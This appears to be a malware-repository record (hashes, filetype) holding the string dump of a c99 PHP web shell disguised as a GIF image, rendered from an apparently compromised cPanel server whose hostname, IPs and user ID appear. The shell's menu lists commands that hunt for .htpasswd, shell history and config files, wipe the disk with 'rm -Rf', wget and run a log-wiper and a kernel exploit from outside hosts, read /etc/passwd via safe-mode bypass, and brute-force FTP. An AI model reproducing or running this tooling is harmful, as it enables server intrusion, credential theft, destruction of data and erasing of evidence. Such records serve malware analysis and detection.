config.inc.php files\n<OPTION VALUE=\"find . -type f -name config.inc.php\">find config.inc.php files in current dir\n<OPTION VALUE=\"find / -type f -name \"config*\">find config* files\n<OPTION VALUE=\"find . -type f -name \"config*\">find config* files in current dir\n<OPTION VALUE=\"find / -type f -perm -2 -ls\">find all writable files\n<OPTION VALUE=\"find . -type f -perm -2 -ls\">find all writable files in current dir\n<OPTION VALUE=\"find /  -type d -perm -2 -ls\">find all writable directories\n<OPTION VALUE=\"find . -type d -perm -2 -ls\">find all writable directories in current dir\n<OPTION VALUE=\"find / -perm -2 -ls\">find all writable directories and files\n<OPTION VALUE=\"find . -perm -2 -ls\">find all writable directories and files in current dir\n<OPTION VALUE=\"find / -type f -name service.pwd\">find all service.pwd files\n<OPTION VALUE=\"find . -type f -name service.pwd\">find service.pwd files in current dir'\n<OPTION VALUE=\"find / -type f -name .htpasswd\">find all .htpasswd files\n<OPTION VALUE=\"find . -type f -name .htpasswd\">find .htpasswd files in current dir\n<OPTION VALUE=\"find / -type f -name .bash_history\">find all .bash_history files\n<OPTION VALUE=\"find . -type f -name .bash_history\">find .bash_history files in current dir\n<OPTION VALUE=\"find / -type f -name .mysql_history\">find all .mysql_history files\n<OPTION VALUE=\"find . -type f -name .mysql_history\">find .mysql_history files in current dir\n<OPTION VALUE=\"find / -type f -name .fetchmailrc\">find all .fetchmailrc files\n<OPTION VALUE=\"find . -type f -name .fetchmailrc\">find .fetchmailrc files in current dir\n<OPTION VALUE=\"lsattr -va\">list file attributes on a Linux second extended file system\n\t\t\t\n                    <OPTION VALUE=\"rm -Rf\">Format this box.\n                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)\n                    <OPTION VALUE=\"gcc zap2.c -o zap2\">WIPELOGS PT2\n                    <OPTION VALUE=\"./zap2\">WIPELOGS PT3\n                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)\n                    <OPTION VALUE=\"./k3 1\">Kernel attack (Krad.c) PT2 (L1)\n                    <OPTION VALUE=\"./k3 2\">Kernel attack (Krad.c) PT2 (L2)\n                    <OPTION VALUE=\"./k3 3\">Kernel attack (Krad.c) PT2 (L3)\n                    <OPTION VALUE=\"./k3 4\">Kernel attack (Krad.c) PT2 (L4)\n                    <OPTION VALUE=\"./k3 5\">Kernel attack (Krad.c) PT2 (L5)\n                  </SELECT>\n        <input type=hidden name=\"cmd_txt\" value=\"1\">\n        &nbsp;\n        <input type=submit name=submit value=\"Execute\"></div>\n    </form>\n    </td>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n  <center><br/><b>:: Kernel Info :: </b>\n<form action=http://google.com/search name=f><input type=hidden name=client value=\"firefox-a\"><input type=hidden name=rls value=\"org.mozilla:en-US:official_s\"><input type=hidden name=hl value=en><input id=sf maxLength=256 name=q value=\"Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09\nEST 2011 i686\" size=30>&nbsp;<input type=submit value=\"Search\" name=btnG></form>\n</center>\n    </td>\n</tr></TABLE><br>\n<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>\n<tr>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n    <div align=\"center\">Php Safe-Mode Bypass (Read Files)\n    </div><br>\n    <form action=\"?\">\n      <div align=\"center\">\n      File: <input type=\"text\" name=\"file\" method=\"get\"> <input type=\"submit\" value=\"Read File\"><br><br> eg: /etc/passwd<br>\n      \n      \n      \n           \n      \n      \n      \t\n\t\n          <br>\n      </div>\n    </form>\n    </td>\n  <td width=\"50%\" height=\"83\" valign=\"top\"><center>\n   <center>Php Safe-Mode Bypass (List Directories):     <form action=\"?\">\n      <div align=\"center\"><br>\n      Dir: <input type=\"text\" name=\"directory\" method=\"get\"> <input type=\"submit\" value=\"List Directory\"><br><br> eg: /etc/<br>\n\n    </form></center>\n    </td>\n</tr></TABLE>\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go Dir ::</b><form action=\"?\"><input type=hidden name=act value=\"ls\"><input type=\"text\" name=\"d\" size=\"50\" value=\"/scripts/\">&nbsp;<input type=submit value=\"Go\"></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go File ::</b><form action=\"?\"><input type=hidden name=act value=\"gofile\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"f\" size=\"50\" value=\"/scripts/\">&nbsp;<input type=submit value=\"Go\"></form></center></td></tr></table>\n</td>\n</tr>\n</TABLE>\n<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"990\" height=\"1\" valign=\"top\"><p align=\"center\"><b>--[ c99shell modded by synsta. | Page generation time: 0.0587 ]--</p></td></tr></table>\n<br/></body></html>"
    },
    "filename": "VirusShare_043a143eb79664e143dfb525b216fcfd",
    "filesize": 87008,
    "filetype": "GIF image data 3425 x 15370",
    "hashes": {
        "md5": "043a143eb79664e143dfb525b216fcfd",
        "sha1": "9b5bcf11dc68c11ff24d2713b24f647938f3c756",
        "sha256": "7f0877369305c77731b5ec5a0b6662e8485946a7018e0da0e3229fa66a893ec6"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "GIF89;a",
            "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language\" content=\"en-us\"><title>c99 v0.0.1 SYN-MOD [SYNSTA] @www.charmainesinclairlive.co.uk</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor=\"#C0C0C0\"><tr><th width=\"101%\" height=\"15\" nowrap bordercolor=\"#C0C0C0\" valign=\"top\" colspan=\"2\"><p><font face=Webdings size=6><b>!</b></font><a href=\"?\"><font face=\"Verdana\" size=\"5\"><b>c99 v0.0.1 SYN-MOD [SYNSTA]</b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align=\"left\"><b>Software:&nbsp;Apache. <a href=\"?act=phpinfo\" target=\"_blank\"><b><u>PHP/5.2.9</u></b></a></b>&nbsp;</p><p align=\"left\"><b>uname -a:&nbsp;Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09 EST 2011 i686</b>&nbsp;</p><b>Disabled functions</b> : <b><font color=green>NONE</font></b><p align=\"left\"><b>We are: uid=608(chsclair) gid=605(chsclair) groups=605(chsclair)<br>context=system_u:system_r:crond_t:s0-s0:c0.c1023<br/>cURL: <b><font color=green>ON</font><br/>MySQL: <b><font color=green>ON</font></b><br/>MSSQL: <b><font color=red>OFF</font><br/>PostgreSQL: <b><font color=red>OFF</font><br/>Oracle: <b><font color=red>OFF</font> </b>&nbsp;</p><p align=\"left\"><b>Safe-mode:&nbsp;<font color=green>OFF (not secure)</font></b></p><p align=\"left\"><a href=\"?act=ls&d=%2F&sort=0a\"><b>/</b></a><a href=\"?act=ls&d=%2Fscripts%2F&sort=0a\"><b>scripts/</b></a>&nbsp;&nbsp;&nbsp;<b><font color=white>drwxr-xr-x</font></b><br><b>Free 6.76 GB of 7.65 GB (88.4%)</b><br><b>Your ip: <a href=http://87.177.181.133>87.177.181.133</a> - Server ip: <a href=http://109.75.162.166>109.75.162.166</a></b><br/><a href=\"?\"><hr><b>[Home]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=search&d=%2Fscripts%2F\"><b>[Search]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=fsbuff&d=%2Fscripts%2F\"><b>[Buffer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=encoder&d=%2Fscripts%2F\"><b>[Encoder]</b></b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=tools&d=%2Fscripts%2F\"><b>[Tools]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=processes&d=%2Fscripts%2F\"><b>[Processes]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=ftpquickbrute&d=%2Fscripts%2F\"><b>[FTP Brute Forcer]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=security&d=%2Fscripts%2F\"><b>[Server Security Information]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=sql&d=%2Fscripts%2F\"><b>[SQL Manager]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=eval&d=%2Fscripts%2F&eval=readfile('/etc/passwd');\"><b>[Eval PHP code]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=selfremove\"><b>[Self remove]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"?act=cmd&cmd=cat+%2Fvar%2Fcpanel%2Faccounting.log&cmd_txt=1&submit=Execute\"><b>[Cpanel Logs]</b></a>&nbsp;&nbsp;&nbsp;&nbsp;</p></td></tr></table><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\"><b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;[setupmailserver]&nbsp;setupmailserver (10.91 KB) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color=white>-rwxr-xr-x</font></b><br>Select action/file-type:<br> <a href=\"?act=f&f=setupmailserver&ft=info&d=%2Fscripts%2F\"><b><u>[hex]</u></b></a> (<a href=\"?act=f&f=setupmailserver&ft=info&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=setupmailserver&ft=html&d=%2Fscripts%2F\"><b>[html]</b></a> (<a href=\"?act=f&f=setupmailserver&ft=html&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=setupmailserver&ft=txt&d=%2Fscripts%2F\"><b>[txt]</b></a> (<a href=\"?act=f&f=setupmailserver&ft=txt&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=setupmailserver&ft=code&d=%2Fscripts%2F\"><b>[Code]</b></a> (<a href=\"?act=f&f=setupmailserver&ft=code&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=setupmailserver&ft=phpsess&d=%2Fscripts%2F\"><b>[Session]</b></a> (<a href=\"?act=f&f=setupmailserver&ft=phpsess&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=setupmailserver&ft=exe&d=%2Fscripts%2F\"><b>[exe]</b></a> (<a href=\"?act=f&f=setupmailserver&ft=exe&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=setupmailserver&ft=sdb&d=%2Fscripts%2F\"><b>[SDB]</b></a> (<a href=\"?act=f&f=setupmailserver&ft=sdb&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=setupmailserver&ft=img&d=%2Fscripts%2F\"><b>[gif]</b></a> (<a href=\"?act=f&f=setupmailserver&ft=img&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=setupmailserver&ft=ini&d=%2Fscripts%2F\"><b>[ini]</b></a> (<a href=\"?act=f&f=setupmailserver&ft=ini&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=setupmailserver&ft=download&d=%2Fscripts%2F\"><b>[download]</b></a> (<a href=\"?act=f&f=setupmailserver&ft=download&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=setupmailserver&ft=notepad&d=%2Fscripts%2F\"><b>[rtf]</b></a> (<a href=\"?act=f&f=setupmailserver&ft=notepad&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) | <a href=\"?act=f&f=setupmailserver&ft=edit&d=%2Fscripts%2F\"><b>[change]</b></a> (<a href=\"?act=f&f=setupmailserver&ft=edit&white=1&d=%2Fscripts%2F\" target=\"_blank\">+</a>) |<hr size=\"1\" noshade><b>Information:</b><table border=0 cellspacing=1 cellpadding=2><tr><td><b>Path</b></td><td> /scripts/setupmailserver</td></tr><tr><td><b>Size</b></td><td> 10.91 KB</td></tr><tr><td><b>MD5</b></td><td> e4ede921f3225f573b93d29cf4a06de4</td></tr><tr><td><b>Owner/Group</b></td><td> root/root<tr><td><b>Perms</b></td><td><a href=\"?act=chmod&f=setupmailserver&d=%2Fscripts%2F\"><font color=white>-rwxr-xr-x</font></a></td></tr><tr><td><b>Create time</b></td><td> 07/02/2011 12:25:56</td></tr><tr><td><b>Access time</b></td><td> 13/01/2011 03:54:36</td></tr><tr><td><b>MODIFY time</b></td><td> 09/11/2010 01:55:17</td></tr></table><br><b>FULL HEXDUMP</b><table border=0 bgcolor=#666666 cellspacing=1 cellpadding=4><tr><td bgcolor=#666666>00000000<br>00000018<br>00000030<br>00000048<br>00000060<br>00000078<br>00000090<br>000000A8<br>000000C0<br>000000D8<br>000000F0<br>00000108<br>00000120<br>00000138<br>00000150<br>00000168<br>00000180<br>00000198<br>000001B0<br>000001C8<br>000001E0<br>000001F8<br>00000210<br>00000228<br>00000240<br>00000258<br>00000270<br>00000288<br>000002A0<br>000002B8<br>000002D0<br>000002E8<br>00000300<br>00000318<br>00000330<br>00000348<br>00000360<br>00000378<br>00000390<br>000003A8<br>000003C0<br>000003D8<br>000003F0<br>00000408<br>00000420<br>00000438<br>00000450<br>00000468<br>00000480<br>00000498<br>000004B0<br>000004C8<br>000004E0<br>000004F8<br>00000510<br>00000528<br>00000540<br>00000558<br>00000570<br>00000588<br>000005A0<br>000005B8<br>000005D0<br>000005E8<br>00000600<br>00000618<br>00000630<br>00000648<br>00000660<br>00000678<br>00000690<br>000006A8<br>000006C0<br>000006D8<br>000006F0<br>00000708<br>00000720<br>00000738<br>00000750<br>00000768<br>00000780<br>00000798<br>000007B0<br>000007C8<br>000007E0<br>000007F8<br>00000810<br>00000828<br>00000840<br>00000858<br>00000870<br>00000888<br>000008A0<br>000008B8<br>000008D0<br>000008E8<br>00000900<br>00000918<br>00000930<br>00000948<br>00000960<br>00000978<br>00000990<br>000009A8<br>000009C0<br>000009D8<br>000009F0<br>00000A08<br>00000A20<br>00000A38<br>00000A50<br>00000A68<br>00000A80<br>00000A98<br>00000AB0<br>00000AC8<br>00000AE0<br>00000AF8<br>00000B10<br>00000B28<br>00000B40<br>00000B58<br>00000B70<br>00000B88<br>00000BA0<br>00000BB8<br>00000BD0<br>00000BE8<br>00000C00<br>00000C18<br>00000C30<br>00000C48<br>00000C60<br>00000C78<br>00000C90<br>00000CA8<br>00000CC0<br>00000CD8<br>00000CF0<br>00000D08<br>00000D20<br>00000D38<br>00000D50<br>00000D68<br>00000D80<br>00000D98<br>00000DB0<br>00000DC8<br>00000DE0<br>00000DF8<br>00000E10<br>00000E28<br>00000E40<br>00000E58<br>00000E70<br>00000E88<br>00000EA0<br>00000EB8<br>00000ED0<br>00000EE8<br>00000F00<br>00000F18<br>00000F30<br>00000F48<br>00000F60<br>00000F78<br>00000F90<br>00000FA8<br>00000FC0<br>00000FD8<br>00000FF0<br>00001008<br>00001020<br>00001038<br>00001050<br>00001068<br>00001080<br>00001098<br>000010B0<br>000010C8<br>000010E0<br>000010F8<br>00001110<br>00001128<br>00001140<br>00001158<br>00001170<br>00001188<br>000011A0<br>000011B8<br>000011D0<br>000011E8<br>00001200<br>00001218<br>00001230<br>00001248<br>00001260<br>00001278<br>00001290<br>000012A8<br>000012C0<br>000012D8<br>000012F0<br>00001308<br>00001320<br>00001338<br>00001350<br>00001368<br>00001380<br>00001398<br>000013B0<br>000013C8<br>000013E0<br>000013F8<br>00001410<br>00001428<br>00001440<br>00001458<br>00001470<br>00001488<br>000014A0<br>000014B8<br>000014D0<br>000014E8<br>00001500<br>00001518<br>00001530<br>00001548<br>00001560<br>00001578<br>00001590<br>000015A8<br>000015C0<br>000015D8<br>000015F0<br>00001608<br>00001620<br>00001638<br>00001650<br>00001668<br>00001680<br>00001698<br>000016B0<br>000016C8<br>000016E0<br>000016F8<br>00001710<br>00001728<br>00001740<br>00001758<br>00001770<br>00001788<br>000017A0<br>000017B8<br>000017D0<br>000017E8<br>00001800<br>00001818<br>00001830<br>00001848<br>00001860<br>00001878<br>00001890<br>000018A8<br>000018C0<br>000018D8<br>000018F0<br>00001908<br>00001920<br>00001938<br>00001950<br>00001968<br>00001980<br>00001998<br>000019B0<br>000019C8<br>000019E0<br>000019F8<br>00001A10<br>00001A28<br>00001A40<br>00001A58<br>00001A70<br>00001A88<br>00001AA0<br>00001AB8<br>00001AD0<br>00001AE8<br>00001B00<br>00001B18<br>00001B30<br>00001B48<br>00001B60<br>00001B78<br>00001B90<br>00001BA8<br>00001BC0<br>00001BD8<br>00001BF0<br>00001C08<br>00001C20<br>00001C38<br>00001C50<br>00001C68<br>00001C80<br>00001C98<br>00001CB0<br>00001CC8<br>00001CE0<br>00001CF8<br>00001D10<br>00001D28<br>00001D40<br>00001D58<br>00001D70<br>00001D88<br>00001DA0<br>00001DB8<br>00001DD0<br>00001DE8<br>00001E00<br>00001E18<br>00001E30<br>00001E48<br>00001E60<br>00001E78<br>00001E90<br>00001EA8<br>00001EC0<br>00001ED8<br>00001EF0<br>00001F08<br>00001F20<br>00001F38<br>00001F50<br>00001F68<br>00001F80<br>00001F98<br>00001FB0<br>00001FC8<br>00001FE0<br>00001FF8<br>00002010<br>00002028<br>00002040<br>00002058<br>00002070<br>00002088<br>000020A0<br>000020B8<br>000020D0<br>000020E8<br>00002100<br>00002118<br>00002130<br>00002148<br>00002160<br>00002178<br>00002190<br>000021A8<br>000021C0<br>000021D8<br>000021F0<br>00002208<br>00002220<br>00002238<br>00002250<br>00002268<br>00002280<br>00002298<br>000022B0<br>000022C8<br>000022E0<br>000022F8<br>00002310<br>00002328<br>00002340<br>00002358<br>00002370<br>00002388<br>000023A0<br>000023B8<br>000023D0<br>000023E8<br>00002400<br>00002418<br>00002430<br>00002448<br>00002460<br>00002478<br>00002490<br>000024A8<br>000024C0<br>000024D8<br>000024F0<br>00002508<br>00002520<br>00002538<br>00002550<br>00002568<br>00002580<br>00002598<br>000025B0<br>000025C8<br>000025E0<br>000025F8<br>00002610<br>00002628<br>00002640<br>00002658<br>00002670<br>00002688<br>000026A0<br>000026B8<br>000026D0<br>000026E8<br>00002700<br>00002718<br>00002730<br>00002748<br>00002760<br>00002778<br>00002790<br>000027A8<br>000027C0<br>000027D8<br>000027F0<br>00002808<br>00002820<br>00002838<br>00002850<br>00002868<br>00002880<br>00002898<br>000028B0<br>000028C8<br>000028E0<br>000028F8<br>00002910<br>00002928<br>00002940<br>00002958<br>00002970<br>00002988<br>000029A0<br>000029B8<br>000029D0<br>000029E8<br>00002A00<br>00002A18<br>00002A30<br>00002A48<br>00002A60<br>00002A78<br>00002A90<br>00002AA8<br>00002AC0<br>00002AD8<br>00002AF0<br>00002B08<br>00002B20<br>00002B38<br>00002B50<br>00002B68<br>00002B80<br>00002B98<br></td><td bgcolor=000000>23 21 2F 75 73 72 2F 62 69 6E 2F 70 65 72 6C 0A 23 20 63 70 61 6E 65 6C <br>20 2D 20 73 65 74 75 70 6D 61 69 6C 73 65 72 76 65 72 20 20 20 20 20 20 <br>20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 43 6F 70 79 72 69 <br>67 68 74 28 63 29 20 32 30 31 30 20 63 50 61 6E 65 6C 2C 20 49 6E 63 2E <br>0A 23 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 <br>20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 <br>20 20 20 20 20 20 20 20 20 20 20 20 20 41 6C 6C 20 72 69 67 68 74 73 20 <br>52 65 73 65 72 76 65 64 2E 0A 23 20 63 6F 70 79 72 69 67 68 74 40 63 70 <br>61 6E 65 6C 2E 6E 65 74 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 <br>20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 <br>20 68 74 74 70 3A 2F 2F 63 70 61 6E 65 6C 2E 6E 65 74 0A 23 20 54 68 69 <br>73 20 63 6F 64 65 20 69 73 20 73 75 62 6A 65 63 74 20 74 6F 20 74 68 65 <br>20 63 50 61 6E 65 6C 20 6C 69 63 65 6E 73 65 2E 20 55 6E 61 75 74 68 6F <br>72 69 7A 65 64 20 63 6F 70 79 69 6E 67 20 69 73 20 70 72 6F 68 69 62 69 <br>74 65 64 0A 0A 42 45 47 49 4E 20 7B 20 75 6E 73 68 69 66 74 20 40 49 4E <br>43 2C 20 27 2F 75 73 72 2F 6C 6F 63 61 6C 2F 63 70 61 6E 65 6C 27 3B 20 <br>7D 0A 0A 75 73 65 20 73 74 72 69 63 74 3B 0A 75 73 65 20 43 70 61 6E 65 <br>6C 3A 3A 43 6F 6E 66 69 67 20 20 20 20 20 20 20 20 20 20 28 29 3B 0A 75 <br>73 65 20 43 70 61 6E 65 6C 3A 3A 43 68 6B 73 65 72 76 64 20 20 20 20 20 <br>20 20 20 28 29 3B 0A 75 73 65 20 43 70 61 6E 65 6C 3A 3A 53 79 73 3A 3A <br>4F 53 20 20 20 20 20 20 20 20 20 28 29 3B 0A 75 73 65 20 43 70 61 6E 65 <br>6C 3A 3A 53 65 72 76 69 63 65 73 20 20 20 20 20 20 20 20 28 29 3B 0A 75 <br>73 65 20 43 70 61 6E 65 6C 3A 3A 53 61 66 65 52 75 6E 3A 3A 45 72 72 6F <br>72 73 20 28 29 3B 0A 75 73 65 20 43 70 61 6E 65 6C 3A 3A 53 53 4C 43 65 <br>72 74 73 20 20 20 20 20 20 20 20 28 29 3B 0A 75 73 65 20 43 70 61 6E 65 <br>6C 3A 3A 55 73 61 67 65 20 20 20 20 20 20 20 20 20 20 20 28 29 3B 0A 75 <br>73 65 20 43 70 61 6E 65 6C 3A 3A 50 49 44 20 20 20 20 20 20 20 20 20 20 <br>20 20 20 28 29 3B 0A 75 73 65 20 43 70 61 6E 65 6C 3A 3A 49 6E 69 74 20 <br>20 20 20 20 20 20 20 20 20 20 20 28 29 3B 0A 75 73 65 20 43 70 61 6E 65 <br>6C 3A 3A 55 70 64 61 74 65 20 20 20 20 20 20 20 20 20 20 28 29 3B 0A 0A <br>6D 79 20 24 68 65 6C 70 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 <br>20 20 20 20 3D 20 30 3B 0A 6D 79 20 24 6D 61 6E 20 20 20 20 20 20 20 20 <br>20 20 20 20 20 20 20 20 20 20 20 20 20 3D 20 30 3B 0A 6D 79 20 24 66 6F <br>72 63 65 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 3D 20 <br>30 3B 0A 6D 79 20 24 63 75 72 72 65 6E 74 20 20 20 20 20 20 20 20 20 20 <br>20 20 20 20 20 20 20 3D 20 30 3B 0A 6D 79 20 24 73 6B 69 70 5F 6D 61 69 <br>6C 64 69 72 5F 63 6F 6E 76 65 72 73 69 6F 6E 20 3D 20 30 3B 0A 24 7C 20 <br>3D 20 31 3B 0A 0A 64 65 6C 65 74 65 20 24 45 4E 56 7B 27 63 70 5F 73 65 <br>63 75 72 69 74 79 5F 74 6F 6B 65 6E 27 7D 3B 0A 64 65 6C 65 74 65 20 24 <br>45 4E 56 7B 27 48 54 54 50 5F 52 45 46 45 52 45 52 27 7D 3B 0A 0A 23 20 <br>41 72 67 75 6D 65 6E 74 20 70 72 6F 63 65 73 73 69 6E 67 0A 6D 79 20 25 <br>6F 70 74 73 20 3D 20 28 0A 20 20 20 20 27 66 6F 72 63 65 27 20 20 20 20 <br>20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 3D 3E 20 5C 24 66 6F 72 63 <br>65 2C 0A 20 20 20 20 27 63 75 72 72 65 6E 74 27 20 20 20 20 20 20 20 20 <br>20 20 20 20 20 20 20 20 20 3D 3E 20 5C 24 63 75 72 72 65 6E 74 2C 0A 20 <br>20 20 20 27 73 6B 69 70 2D 6D 61 69 6C 64 69 72 2D 63 6F 6E 76 65 72 73 <br>69 6F 6E 27 20 3D 3E 20 5C 24 73 6B 69 70 5F 6D 61 69 6C 64 69 72 5F 63 <br>6F 6E 76 65 72 73 69 6F 6E 2C 0A 29 3B 0A 0A 43 70 61 6E 65 6C 3A 3A 55 <br>73 61 67 65 3A 3A 77 72 61 70 5F 6F 70 74 69 6F 6E 73 28 20 5C 40 41 52 <br>47 56 2C 20 5C 26 75 73 61 67 65 2C 20 5C 25 6F 70 74 73 20 29 3B 0A 0A <br>40 41 52 47 56 20 3D 20 28 20 67 72 65 70 28 20 21 2F 5E 2D 2D 2F 2C 20 <br>40 41 52 47 56 20 29 20 29 3B 0A 0A 6D 79 20 24 73 65 6C 65 63 74 65 64 <br>5F 6D 61 69 6C 73 65 72 76 65 72 20 3D 20 73 68 69 66 74 3B 0A 75 73 61 <br>67 65 28 29 20 75 6E 6C 65 73 73 20 28 20 24 73 65 6C 65 63 74 65 64 5F <br>6D 61 69 6C 73 65 72 76 65 72 20 7C 7C 20 24 63 75 72 72 65 6E 74 20 29 <br>3B 0A 0A 6D 79 20 24 63 70 63 6F 6E 66 5F 72 65 66 20 3D 20 43 70 61 6E <br>65 6C 3A 3A 43 6F 6E 66 69 67 3A 3A 6C 6F 61 64 63 70 63 6F 6E 66 28 29 <br>3B 0A 6D 79 20 24 73 74 6F 72 61 67 65 5F 74 79 70 65 20 3D 20 24 63 70 <br>63 6F 6E 66 5F 72 65 66 2D 3E 7B 27 6D 61 69 6C 64 69 72 27 7D 20 3F 20 <br>27 6D 61 69 6C 64 69 72 27 20 3A 20 27 6D 62 6F 78 27 3B 0A 24 63 70 63 <br>6F 6E 66 5F 72 65 66 2D 3E 7B 27 6D 61 69 6C 73 65 72 76 65 72 27 7D 20 <br>3D 20 24 73 74 6F 72 61 67 65 5F 74 79 70 65 20 65 71 20 27 6D 62 6F 78 <br>27 20 3F 20 27 63 70 70 6F 70 27 20 3A 20 64 65 66 69 6E 65 64 20 24 63 <br>70 63 6F 6E 66 5F 72 65 66 2D 3E 7B 27 6D 61 69 6C 73 65 72 76 65 72 27 <br>7D 20 3F 20 24 63 70 63 6F 6E 66 5F 72 65 66 2D 3E 7B 27 6D 61 69 6C 73 <br>65 72 76 65 72 27 7D 20 3A 20 27 63 6F 75 72 69 65 72 27 3B 0A 6D 79 20 <br>24 6C 61 73 74 5F 61 63 74 69 76 65 5F 6D 61 69 6C 73 65 72 76 65 72 20 <br>3D 20 24 63 70 63 6F 6E 66 